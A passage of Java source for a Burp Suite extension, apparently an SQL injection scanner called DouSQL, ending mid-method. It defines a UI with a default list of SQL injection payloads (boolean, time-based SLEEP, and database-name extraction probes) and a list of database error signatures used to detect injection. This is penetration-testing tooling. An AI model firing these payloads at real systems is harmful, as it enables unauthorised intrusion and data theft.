package dousql;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.handler.HttpHandler;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.handler.RequestToBeSentAction;
import burp.api.montoya.http.handler.ResponseReceivedAction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;
import burp.api.montoya.utilities.json.JsonUtils;
import burp.api.montoya.utilities.json.JsonNode;
import burp.api.montoya.utilities.json.JsonObjectNode;
import burp.api.montoya.utilities.json.JsonArrayNode;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.io.*;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;

public class DouSqlPluginComplete implements BurpExtension, HttpHandler, ContextMenuItemsProvider {

    private MontoyaApi api;
    private JSplitPane splitPane;
    private JTable logTable;
    private JTable payloadTable;
    private AbstractTableModel model;

    // 数据存储
    private final List<LogEntry> log = new ArrayList<>();
    private final List<LogEntry> log2 = new ArrayList<>();
    private final List<LogEntry> log3 = new ArrayList<>();
    private final List<RequestMd5> log4Md5 = new ArrayList<>();

    // 配置目录常量
    private static String CONFIG_DIR = "dousql"; 
    private static String JAR_DIR = ""; 
    
    // 配置变量
    private int switchs = 1; 
    private int clicksRepeater = 0; 
    private int clicksProxy = 0; 
    private int count = 0; 
    private String dataMd5Id; 
    private int originalDataLen; 
    private int isInt = 1; 
    private String tempData; 
    private int jTextAreaInt = 0; 
    private String jTextAreaData1 = ""; 
    private int diyPayload1 = 1; 
    private int diyPayload2 = 0; 
    private int selectRow = 0; 
    private int isCookie = -1; 
    private String whiteURL = "";
    private int whiteSwitchs = 0; 

    // FUZZ相关变量
    private JTextArea fuzzParamsTextArea;
    private JCheckBox enableFuzzParamsCheckBox;
    private JButton saveFuzzParamsBtn;
    private List<String> fuzzParamsList = new ArrayList<>(); 
    private int enableFuzzParams = 0; 

    private JTextArea payloadTextArea;
    private JTextField whiteTextField;
    private JLabel jls4;
    private JLabel jls5;
    private JButton btn1, btn2, btn3;
    private JCheckBox chkbox1, chkbox2, chkbox3, chkbox4, chkbox5, chkbox6, chkbox7, chkbox8;

    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    private JTabbedPane whiteTabbedPane;
    private JCheckBox enableCustomErrorCheckBox;
    private JTextArea errorKeywordsTextArea;
    private List<String> errorKeywordsList = new ArrayList<>();
    private int enableCustomError = 0; 

    private List<String> whiteListParams = new ArrayList<>(); 
    private List<String> blackListParams = new ArrayList<>(); 
    private int paramListMode = 0; 

    private int lengthDiffThreshold = 100; 
    private JTextField lengthDiffThresholdField;
    private JButton saveLengthDiffThresholdBtn;

    private int responseTimeThreshold = 2000; 

    private JComboBox<String> payloadGroupComboBox;
    private JButton newGroupBtn;
    private JButton deleteGroupBtn;
    private JButton renameGroupBtn;
    private JTextField newGroupNameField;
    private String currentGroup = "default";
    private List<String> payloadGroups = new ArrayList<>();
    private JTextField responseTimeThresholdField;
    private JButton saveResponseTimeThresholdBtn;

    private JRadioButton noFilterRadio;
    private JRadioButton whiteListRadio;
    private JRadioButton blackListRadio;
    private JTextArea paramListTextArea;
    private JButton saveParamListBtn;
    private JButton saveErrorBtn;

    private List<String> blackListUrls = new ArrayList<>(); 
    private JTextArea blackListUrlTextArea;
    private JButton saveBlackListUrlBtn;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("DouSQL V3.0.3 (U-Sec Team)"); 
        optimizeUIForWindows();
        initializeConfigDirectory();
        createConfigDirectory();

        api.logging().logToOutput("DouSQL V3.0.3 (U-Sec Team) Loaded - l1ch & w1th0ut");
        api.logging().logToOutput("jar包目录: " + JAR_DIR);
        api.logging().logToOutput("配置文件目录: " + CONFIG_DIR);

        api.http().registerHttpHandler(this);
        api.userInterface().registerContextMenuItemsProvider(this);
        SwingUtilities.invokeLater(this::createUI);
    }

    private void initializeConfigDirectory() {
        try {
            String userSpecifiedDir = System.getProperty("dousql.config.dir");
            if (userSpecifiedDir != null && !userSpecifiedDir.trim().isEmpty()) {
                JAR_DIR = userSpecifiedDir;
                CONFIG_DIR = JAR_DIR + File.separator + "dousql";
                return;
            }
            String jarPath = null;
            boolean useHomeDir = true;
            try {
                jarPath = this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
                if (jarPath != null && jarPath.endsWith(".jar")) {
                    File jarFile = new File(jarPath);
                    JAR_DIR = jarFile.getParent();
                    useHomeDir = false;
                }
            } catch (Exception e) {}
            if (useHomeDir) {
                JAR_DIR = System.getProperty("user.home");
                CONFIG_DIR = JAR_DIR + File.separator + "dousql";
            } else {
                CONFIG_DIR = JAR_DIR + File.separator + "dousql";
            }
        } catch (Exception e) {
            JAR_DIR = System.getProperty("user.home");
            CONFIG_DIR = JAR_DIR + File.separator + "dousql";
        }
    }

    private void createConfigDirectory() {
        File configDir = new File(CONFIG_DIR);
        if (!configDir.exists()) {
            configDir.mkdirs();
        }
    }

    private String getConfigFilePath(String filename) {
        return CONFIG_DIR + File.separator + filename;
    }

    private void createUI() {
        splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        JSplitPane splitPanes = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        JSplitPane splitPanes2 = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

        logTable = new Table(new LeftTableModel());
        JScrollPane scrollPane = new JScrollPane(logTable);

        model = new MyModel();
        payloadTable = new PayloadTable(model);
        JScrollPane payloadScrollPane = new JScrollPane(payloadTable);

        JPanel mainPanel = new JPanel(new BorderLayout());
        JSplitPane tablesSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        
        JPanel leftTablePanel = new JPanel(new BorderLayout());
        leftTablePanel.setBorder(BorderFactory.createTitledBorder("扫描结果"));
        leftTablePanel.add(scrollPane, BorderLayout.CENTER);
        
        JPanel rightTablePanel = new JPanel(new BorderLayout());
        rightTablePanel.setBorder(BorderFactory.createTitledBorder("参数测试详情"));
        rightTablePanel.add(payloadScrollPane, BorderLayout.CENTER);
        
        tablesSplitPane.setLeftComponent(leftTablePanel);
        tablesSplitPane.setRightComponent(rightTablePanel);
        tablesSplitPane.setDividerLocation(0.5);
        tablesSplitPane.setResizeWeight(0.5);
        
        mainPanel.add(tablesSplitPane, BorderLayout.CENTER);

        JPanel controlPanel = new JPanel(new BorderLayout());
        controlPanel.setBorder(BorderFactory.createTitledBorder("控制面板"));
        
        JPanel controlOptionsPanel = new JPanel(new GridBagLayout());
        controlOptionsPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.anchor = GridBagConstraints.WEST;
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        gbc.insets = new Insets(1, 0, 1, 0);

        JLabel jls = new JLabel("DouSQL U-Sec｜l1ch X w1th0ut");

        chkbox1 = new JCheckBox("启动插件", true);
        chkbox2 = new JCheckBox("监控Repeater");
        chkbox3 = new JCheckBox("监控Proxy");
        chkbox4 = new JCheckBox("值是数字则进行-1、-0", true);
        chkbox8 = new JCheckBox("测试Cookie");

        jls5 = new JLabel("如果需要多个域名加白请用,隔开");
        whiteTextField = new JTextField("填写白名单域名");
        whiteTextField.setPreferredSize(new Dimension(220, 25));
        whiteTextField.setMinimumSize(new Dimension(180, 25));
        whiteTextField.setMaximumSize(new Dimension(300, 25));
        whiteTextField.setBorder(BorderFactory.createLoweredBevelBorder());
        
        btn1 = new JButton("清空列表");
        btn2 = new JButton("加载/重新加载payload");
        btn3 = new JButton("启动白名单");
        
        btn1.setPreferredSize(new Dimension(120, 25));
        btn2.setPreferredSize(new Dimension(150, 25));
        btn3.setPreferredSize(new Dimension(120, 25));

        int row = 0;
        gbc.gridy = row++; 
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        gbc.insets = new Insets(2, 0, 2, 0);
        controlOptionsPanel.add(jls, gbc);
    
        gbc.gridy = row++; 
        gbc.insets = new Insets(3, 0, 1, 0);
        gbc.fill = GridBagConstraints.NONE;
        gbc.weightx = 0.0;
        controlOptionsPanel.add(chkbox1, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(1, 0, 1, 0);
        controlOptionsPanel.add(chkbox2, gbc);
        
        gbc.gridy = row++; 
        controlOptionsPanel.add(chkbox3, gbc);
        
        gbc.gridy = row++; 
        controlOptionsPanel.add(chkbox4, gbc);
        
        gbc.gridy = row++; 
        controlOptionsPanel.add(chkbox8, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(8, 0, 3, 0);
        controlOptionsPanel.add(btn1, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(5, 0, 2, 0);
        controlOptionsPanel.add(jls5, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(2, 0, 2, 0);
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        controlOptionsPanel.add(whiteTextField, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(2, 0, 3, 0);
        gbc.fill = GridBagConstraints.NONE;
        gbc.weightx = 0.0;
        controlOptionsPanel.add(btn3, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(5, 0, 5, 0);
        controlOptionsPanel.add(btn2, gbc);
        
        gbc.gridy = row++;
        gbc.weighty = 0.1; 
        gbc.fill = GridBagConstraints.VERTICAL;
        gbc.insets = new Insets(0, 0, 0, 0);
        controlOptionsPanel.add(Box.createVerticalStrut(10), gbc); 
        
        controlPanel.add(controlOptionsPanel, BorderLayout.CENTER); 
        
        whiteTabbedPane = new JTabbedPane();
        whiteTabbedPane.setPreferredSize(new Dimension(250, 400));
        whiteTabbedPane.setMinimumSize(new Dimension(200, 300));

        // --- 标签页1：自定义SQL语句 ---
        JPanel customPayloadPanel = new JPanel(new BorderLayout());
        jls4 = new JLabel("修改payload后记得点击加载（配置文件：" + CONFIG_DIR + "/xia_SQL_diy_payload.ini）");

        chkbox5 = new JCheckBox("自定义payload");
        chkbox6 = new JCheckBox("自定义payload中空格url编码", true);
        chkbox7 = new JCheckBox("自定义payload中参数值置空");
        payloadTextArea = new JTextArea("'''\n\"\"\"\n'+Or+1=1+AND+'Xlz'='Xlz\n'+Or+1=2+AND+'Xlz'='Xlz\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)", 18, 16);

        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_diy_payload.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            payloadTextArea.setText(strData);
        } catch (IOException e) {
        }

        payloadTextArea.setForeground(Color.BLACK);
        payloadTextArea.setFont(new Font("楷体", Font.BOLD, 16));
        payloadTextArea.setBackground(Color.LIGHT_GRAY);
        payloadTextArea.setEditable(false);
        JScrollPane textAreaScrollPane = new JScrollPane(payloadTextArea);
        
        JPanel groupPanel = new JPanel(new GridBagLayout());
        GridBagConstraints gbcGroup = new GridBagConstraints();
        gbcGroup.insets = new Insets(2, 2, 2, 2);
        gbcGroup.anchor = GridBagConstraints.WEST;
        
        JLabel groupLabel = new JLabel("测试组:");
        payloadGroupComboBox = new JComboBox<>();
        payloadGroupComboBox.setPreferredSize(new Dimension(80, 25));
        
        newGroupNameField = new JTextField("新组名");
        newGroupNameField.setPreferredSize(new Dimension(80, 25));
        
        newGroupBtn = new JButton("新建");
        renameGroupBtn = new JButton("重命名");
        deleteGroupBtn = new JButton("删除");
        
        Dimension buttonSize = new Dimension(80, 25);
        newGroupBtn.setPreferredSize(buttonSize);
        renameGroupBtn.setPreferredSize(new Dimension(80, 25)); 
        deleteGroupBtn.setPreferredSize(buttonSize);
        
        gbcGroup.gridx = 0; gbcGroup.gridy = 0;
        groupPanel.add(groupLabel, gbcGroup);
        gbcGroup.gridx = 1;
        groupPanel.add(payloadGroupComboBox, gbcGroup);
        gbcGroup.gridx = 2;
        groupPanel.add(newGroupNameField, gbcGroup);
        
        gbcGroup.gridx = 0; gbcGroup.gridy = 1;
        groupPanel.add(newGroupBtn, gbcGroup);
        gbcGroup.gridx = 1;
        groupPanel.add(renameGroupBtn, gbcGroup);
        gbcGroup.gridx = 2;
        groupPanel.add(deleteGroupBtn, gbcGroup);

        JPanel topControlPanel = new JPanel();
        topControlPanel.setLayout(new BoxLayout(topControlPanel, BoxLayout.Y_AXIS));
        topControlPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        jls4.setAlignmentX(Component.LEFT_ALIGNMENT);
        groupPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox5.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox6.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox7.setAlignmentX(Component.LEFT_ALIGNMENT);
        btn2.setAlignmentX(Component.LEFT_ALIGNMENT);
        
        topControlPanel.add(jls4);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(groupPanel);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(chkbox5);
        topControlPanel.add(chkbox6);
        topControlPanel.add(chkbox7);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(btn2);

        customPayloadPanel.add(topControlPanel, BorderLayout.NORTH);
        customPayloadPanel.add(textAreaScrollPane, BorderLayout.CENTER);

        // --- 标签页2：参数过滤配置 ---
        JPanel paramFilterPanel = new JPanel(new BorderLayout());
        paramFilterPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel modePanel = new JPanel(new GridLayout(3, 1, 5, 5));
        noFilterRadio = new JRadioButton("无过滤 (测试所有参数)", paramListMode == 0);
        whiteListRadio = new JRadioButton("白名单模式 (只测试配置参数)", paramListMode == 1);
        blackListRadio = new JRadioButton("黑名单模式 (跳过配置参数)", paramListMode == 2);
        ButtonGroup modeGroup = new ButtonGroup();
        modeGroup.add(noFilterRadio);
        modeGroup.add(whiteListRadio);
        modeGroup.add(blackListRadio);
        modePanel.add(noFilterRadio);
        modePanel.add(whiteListRadio);
        modePanel.add(blackListRadio);

        JPanel paramAreaPanel = new JPanel(new BorderLayout());
        JLabel paramListLabel = new JLabel("参数列表 (每行一个参数名)");
        paramListLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 5, 0));
        paramListTextArea = new JTextArea("username\npassword\nemail\nmobile", 15, 20);
        paramListTextArea.setForeground(Color.BLACK);
        paramListTextArea.setFont(new Font("宋体", Font.PLAIN, 13));
        paramListTextArea.setBackground(Color.WHITE);
        paramListTextArea.setEditable(true);
        JScrollPane paramListScrollPane = new JScrollPane(paramListTextArea);

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
        saveParamListBtn = new JButton("保存参数配置");
        buttonPanel.add(saveParamListBtn);

        paramAreaPanel.add(paramListLabel, BorderLayout.NORTH);
        paramAreaPanel.add(paramListScrollPane, BorderLayout.CENTER);
        paramAreaPanel.add(buttonPanel, BorderLayout.SOUTH);

        paramFilterPanel.add(modePanel, BorderLayout.NORTH);
        paramFilterPanel.add(paramAreaPanel, BorderLayout.CENTER);

        // --- 标签页3：自定义报错信息 ---
        JPanel customErrorPanel = new JPanel(new BorderLayout());
        customErrorPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        enableCustomErrorCheckBox = new JCheckBox("启用自定义报错信息（配置文件：" + CONFIG_DIR + "/xia_SQL_diy_error.ini）", true);
        enableCustomErrorCheckBox.setPreferredSize(new Dimension(400, 25));
        
        JPanel errorCheckPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        errorCheckPanel.add(enableCustomErrorCheckBox);
        customErrorPanel.add(errorCheckPanel, BorderLayout.NORTH);

        JPanel errorTextPanel = new JPanel(new BorderLayout());
        errorTextPanel.setBorder(BorderFactory.createEmptyBorder(5, 0, 0, 0));
        
        JLabel errorLabel = new JLabel("报错关键字配置 (每行一个关键字或正则表达式)");
        errorLabel.setBorder(BorderFactory.createEmptyBorder(0, 0, 5, 0));
        
        errorKeywordsTextArea = new JTextArea("ORA-\\d{5}\nSQL syntax.*?MySQL\nUnknown column\nSQL syntax\njava.sql.SQLSyntaxErrorException\nError SQL:\nSyntax error\n附近有语法错误\njava.sql.SQLException\n引号不完整\nSystem.Exception: SQL Execution Error!\ncom.mysql.jdbc\nMySQLSyntaxErrorException\nvalid MySQL result\nyour MySQL server version\nMySqlClient\nMySqlException\nvalid PostgreSQL result\nPG::SyntaxError:\norg.postgresql.jdbc\nPSQLException\nMicrosoft SQL Native Client error\nODBC SQL Server Driver\nSQLServer JDBC Driver\ncom.jnetdirect.jsql\nmacromedia.jdbc.sqlserver\ncom.microsoft.sqlserver.jdbc\nMicrosoft Access\nAccess Database Engine\nODBC Microsoft Access\nOracle error\nDB2 SQL error\nSQLite error\nSybase message\nSybSQLException", 18, 16);

        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_diy_error.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            errorKeywordsTextArea.setText(strData);
            updateErrorKeywordsList();
        } catch (IOException e) {
        }

        enableCustomError = 1; 
        enableCustomErrorCheckBox.setSelected(true);

        errorKeywordsTextArea.setForeground(Color.BLACK);
        errorKeywordsTextArea.setFont(new Font("楷体", Font.BOLD, 16));
        errorKeywordsTextArea.setBackground(Color.WHITE);
        errorKeywordsTextArea.setEditable(true);
        JScrollPane errorScrollPane = new JScrollPane(errorKeywordsTextArea);

        saveErrorBtn = new JButton("保存报错信息配置");
        saveErrorBtn.setPreferredSize(new Dimension(150, 30));
        
        JPanel errorButtonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        errorButtonPanel.add(saveErrorBtn);
        
        errorTextPanel.add(errorLabel, BorderLayout.NORTH);
        errorTextPanel.add(errorScrollPane, BorderLayout.CENTER);
        errorTextPanel.add(errorButtonPanel, BorderLayout.SOUTH);
        
        customErrorPanel.add(errorTextPanel, BorderLayout.CENTER);

        // --- 标签页4：响应时间阈值配置 ---
        JPanel responseTimePanel = new JPanel(new BorderLayout());
        responseTimePanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel timeConfigPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        JLabel timeThresholdLabel = new JLabel("响应时间阈值（毫秒）:");
        responseTimeThresholdField = new JTextField(String.valueOf(responseTimeThreshold));
        saveResponseTimeThresholdBtn = new JButton("保存阈值设置");
        JLabel timeNoteLabel = new JLabel("注意：当自定义payload的响应时间超过此阈值时，会显示'time > N'");
        timeNoteLabel.setForeground(Color.GRAY);
        timeNoteLabel.setFont(new Font("宋体", Font.PLAIN, 12));

        timeConfigPanel.add(timeThresholdLabel);
        timeConfigPanel.add(responseTimeThresholdField);
        timeConfigPanel.add(new JLabel()); 
        timeConfigPanel.add(saveResponseTimeThresholdBtn);
        timeConfigPanel.add(timeNoteLabel);
        timeConfigPanel.add(new JLabel()); 

        responseTimePanel.add(timeConfigPanel, BorderLayout.NORTH);

        // --- 标签页5：长度差异检测配置 ---
        JPanel lengthDiffPanel = new JPanel(new BorderLayout());
        lengthDiffPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel diffConfigPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        JLabel diffThresholdLabel = new JLabel("长度差异阈值（字节）:");
        lengthDiffThresholdField = new JTextField(String.valueOf(lengthDiffThreshold));
        saveLengthDiffThresholdBtn = new JButton("保存阈值设置");
        JLabel diffNoteLabel = new JLabel("注意：当payload响应长度与原始长度差异超过此阈值时，会显示'diff: +N'或'diff: -N'");
        diffNoteLabel.setForeground(Color.GRAY);
        diffNoteLabel.setFont(new Font("宋体", Font.PLAIN, 12));

        diffConfigPanel.add(diffThresholdLabel);
        diffConfigPanel.add(lengthDiffThresholdField);
        diffConfigPanel.add(new JLabel()); 
        diffConfigPanel.add(saveLengthDiffThresholdBtn);
        diffConfigPanel.add(diffNoteLabel);
        diffConfigPanel.add(new JLabel()); 

        lengthDiffPanel.add(diffConfigPanel, BorderLayout.NORTH);

        // --- 标签页6：黑名单URL过滤配置 ---
        JPanel blackListUrlPanel = new JPanel(new BorderLayout());
        blackListUrlPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel urlConfigPanel = new JPanel(new BorderLayout());
        JLabel urlListLabel = new JLabel("黑名单URL路径 (每行一个路径，支持通配符)");
        urlListLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 5, 0));
        blackListUrlTextArea = new JTextArea("/admin/*\n/static/*\n*.css\n*.js\n*.jpg\n*.jpeg\n*.png\n*.gif\n*.bmp\n*.svg\n*.ico\n*.woff\n*.woff2", 15, 20);
        blackListUrlTextArea.setForeground(Color.BLACK);
        blackListUrlTextArea.setFont(new Font("宋体", Font.PLAIN, 13));
        blackListUrlTextArea.setBackground(Color.WHITE);
        blackListUrlTextArea.setEditable(true);
        JScrollPane urlListScrollPane = new JScrollPane(blackListUrlTextArea);

        JPanel urlButtonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
        saveBlackListUrlBtn = new JButton("保存黑名单URL配置");
        urlButtonPanel.add(saveBlackListUrlBtn);

        urlConfigPanel.add(urlListLabel, BorderLayout.NORTH);
        urlConfigPanel.add(urlListScrollPane, BorderLayout.CENTER);
        urlConfigPanel.add(urlButtonPanel, BorderLayout.SOUTH);

        blackListUrlPanel.add(urlConfigPanel, BorderLayout.CENTER);

        // ====== 新增：标签页7：参数FUZZ配置 ======
        JPanel fuzzParamPanel = new JPanel(new BorderLayout());
        fuzzParamPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        enableFuzzParamsCheckBox = new JCheckBox("启用参数FUZZ探测", false);
        enableFuzzParamsCheckBox.setPreferredSize(new Dimension(400, 25));
        JPanel fuzzCheckPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        fuzzCheckPanel.add(enableFuzzParamsCheckBox);
        
        JPanel fuzzTextAreaPanel = new JPanel(new BorderLayout());
        JLabel fuzzLabel = new JLabel("FUZZ参数列表");
        fuzzLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 5, 0));
        
        fuzzParamsTextArea = new JTextArea("order\norderby\nsort\nby\nid\nuid\nkey\nsearch\nquery\nlimit\noffset", 15, 20);
        fuzzParamsTextArea.setForeground(Color.BLACK);
        fuzzParamsTextArea.setFont(new Font("宋体", Font.PLAIN, 13));
        fuzzParamsTextArea.setBackground(Color.WHITE);
        fuzzParamsTextArea.setEditable(true);
        JScrollPane fuzzScrollPane = new JScrollPane(fuzzParamsTextArea);
        
        JPanel fuzzBtnPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
        saveFuzzParamsBtn = new JButton("保存FUZZ参数配置");
        fuzzBtnPanel.add(saveFuzzParamsBtn);

        fuzzTextAreaPanel.add(fuzzLabel, BorderLayout.NORTH);
        fuzzTextAreaPanel.add(fuzzScrollPane, BorderLayout.CENTER);
        fuzzTextAreaPanel.add(fuzzBtnPanel, BorderLayout.SOUTH);

        fuzzParamPanel.add(fuzzCheckPanel, BorderLayout.NORTH);
        fuzzParamPanel.add(fuzzTextAreaPanel, BorderLayout.CENTER);

        // 读取FUZZ配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_fuzz_params.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            fuzzParamsTextArea.setText(strData);
            fuzzParamsList.clear();
            for (String line : strData.split("\\n")) {
                String trimmedLine = line.trim();
                if (!trimmedLine.isEmpty()) {
                    fuzzParamsList.add(trimmedLine);
                }
            }
        } catch (IOException e) {
             fuzzParamsList.clear();
             String[] defaults = fuzzParamsTextArea.getText().split("\n");
             for(String s : defaults) if(!s.trim().isEmpty()) fuzzParamsList.add(s.trim());
        }
        // ===========================================

        whiteTabbedPane.addTab("自定义SQL语句", customPayloadPanel);
        whiteTabbedPane.addTab("参数过滤配置", paramFilterPanel);
        whiteTabbedPane.addTab("自定义报错信息", customErrorPanel);
        whiteTabbedPane.addTab("响应时间阈值", responseTimePanel);
        whiteTabbedPane.addTab("长度差异配置", lengthDiffPanel);
        whiteTabbedPane.addTab("黑名单URL过滤", blackListUrlPanel);
        whiteTabbedPane.addTab("参数FUZZ配置", fuzzParamPanel); // 添加新Tab

        setupEventListeners();

        requestViewer = api.userInterface().createHttpRequestEditor();
        responseViewer = api.userInterface().createHttpResponseEditor();
        
        JSplitPane requestResponseSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        
        JPanel requestPanel = new JPanel(new BorderLayout());
        requestPanel.setBorder(BorderFactory.createTitledBorder("Request"));
        requestPanel.add(requestViewer.uiComponent(), BorderLayout.CENTER);
        
        JPanel responsePanel = new JPanel(new BorderLayout());
        responsePanel.setBorder(BorderFactory.createTitledBorder("Response"));
        responsePanel.add(responseViewer.uiComponent(), BorderLayout.CENTER);
        
        requestResponseSplitPane.setLeftComponent(requestPanel);
        requestResponseSplitPane.setRightComponent(responsePanel);
        requestResponseSplitPane.setDividerLocation(0.5); 
        requestResponseSplitPane.setResizeWeight(0.5); 

        api.userInterface().applyThemeToComponent(splitPane);
        api.userInterface().applyThemeToComponent(logTable);
        api.userInterface().applyThemeToComponent(scrollPane);
        api.userInterface().applyThemeToComponent(payloadScrollPane);
        api.userInterface().applyThemeToComponent(controlPanel);
        api.userInterface().applyThemeToComponent(mainPanel);
        api.userInterface().applyThemeToComponent(requestResponseSplitPane);
        api.userInterface().applyThemeToComponent(requestPanel);
        api.userInterface().applyThemeToComponent(responsePanel);
        api.userInterface().applyThemeToComponent(tablesSplitPane);
        api.userInterface().applyThemeToComponent(leftTablePanel);
        api.userInterface().applyThemeToComponent(rightTablePanel);
        api.userInterface().applyThemeToComponent(whiteTabbedPane);

        splitPanes2.setTopComponent(controlPanel);
        splitPanes2.setBottomComponent(whiteTabbedPane); 
        splitPanes2.setOrientation(JSplitPane.VERTICAL_SPLIT);
        splitPanes2.setDividerLocation(280); 
        splitPanes2.setResizeWeight(0.0); 

        splitPanes.setTopComponent(mainPanel); 
        splitPanes.setBottomComponent(requestResponseSplitPane); 
        splitPanes.setOrientation(JSplitPane.VERTICAL_SPLIT);
        splitPanes.setDividerLocation(400); 
        splitPanes.setResizeWeight(0.6); 

        splitPane.setLeftComponent(splitPanes); 
        splitPane.setRightComponent(splitPanes2); 
        splitPane.setOrientation(JSplitPane.HORIZONTAL_SPLIT);
        splitPane.setDividerLocation(1000); 
        splitPane.setResizeWeight(0.75); 
        
        splitPanes2.setMinimumSize(new Dimension(250, 400)); 
        splitPanes.setMinimumSize(new Dimension(600, 400));  

        api.userInterface().registerSuiteTab("DouSQL", splitPane);
    }

    private void optimizeUIForWindows() {
        try {
            String osName = System.getProperty("os.name").toLowerCase();
            if (osName.contains("windows")) {
                System.setProperty("sun.java2d.dpiaware", "true");
                System.setProperty("sun.java2d.uiScale", "1.0");
                System.setProperty("awt.useSystemAAFontSettings", "on");
                System.setProperty("swing.aatext", "true");
                java.util.Enumeration<Object> keys = UIManager.getDefaults().keys();
                while (keys.hasMoreElements()) {
                    Object key = keys.nextElement();
                    Object value = UIManager.get(key);
                    if (value instanceof Font) {
                        Font font = (Font) value;
                        UIManager.put(key, new Font(font.getName(), font.getStyle(), Math.max(font.getSize(), 12)));
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void setupEventListeners() {
        chkbox1.addItemListener(e -> {
            if (chkbox1.isSelected()) {
                api.logging().logToOutput("插件DouSQL启动");
                switchs = 1;
            } else {
                api.logging().logToOutput("插件DouSQL关闭");
                switchs = 0;
            }
        });

        chkbox2.addItemListener(e -> {
            if (chkbox2.isSelected()) {
                api.logging().logToOutput("启动 监控Repeater");
                clicksRepeater = 64;
            } else {
                api.logging().logToOutput("关闭 监控Repeater");
                clicksRepeater = 0;
            }
        });

        chkbox3.addItemListener(e -> {
            if (chkbox3.isSelected()) {
                api.logging().logToOutput("启动 监控Proxy");
                clicksProxy = 4;
            } else {
                api.logging().logToOutput("关闭 监控Proxy");
                clicksProxy = 0;
            }
        });

        chkbox4.addItemListener(e -> {
            if (chkbox4.isSelected()) {
                api.logging().logToOutput("启动 值是数字则进行-1、-0");
                isInt = 1;
            } else {
